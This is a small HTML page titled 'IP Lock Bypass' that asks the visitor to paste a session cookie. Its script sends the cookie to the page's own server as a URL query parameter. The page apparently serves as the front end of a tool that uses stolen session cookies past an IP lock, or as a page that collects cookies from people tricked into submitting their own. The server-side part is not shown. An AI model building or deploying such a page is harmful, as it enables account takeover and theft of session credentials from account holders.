 
<title>IP Lock Bypass</title>
        <center>
        <h1> Enter Cookie Below To Bypass IP Lock</h1>
        </center>
        <input name='cookie' id='cookie'>
        <button id='check'>Bypass</button>
        <style>
        body {background: linear-gradient(to right, rgb(156, 236, 251), rgb(101, 199, 247), rgb(0, 82, 212));}
        input {
            position: relative;
            display: block;
            margin: 50px auto;
            width: 35%;
            padding: 16px 30px;
            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
            background-color: #000000;
            color: white;
            border-radius: 15px;
            transition: all 0.3s ease;
            border-color: white;
        }      
        button {
            background-color: #000000;
            border: none;
            color: white;
            padding: 13px 100px;
            border-radius: 8px;
            text-align: center;
            font-size: 16px;
            opacity: 0.6;
            transition: 0.3s;
            display: inline-block;
            text-decoration: none;
            cursor: pointer;
        
            display: block;
            margin: 59px auto;
            font-family: cursive;
            color: white;
        }
        </style>
        
        
        <script>
        

        const check_box = document.getElementById('check');
        const cookie_box = document.getElementById('cookie');
        const dom = window.location.href
        
        check_box.addEventListener('click', async function(event, res) {
            event.preventDefault()
            let cookie = cookie_box.value
            
            window.location.href = ''+dom+'?cookie='+cookie+''
        
        
        
        
        });





        </script>
        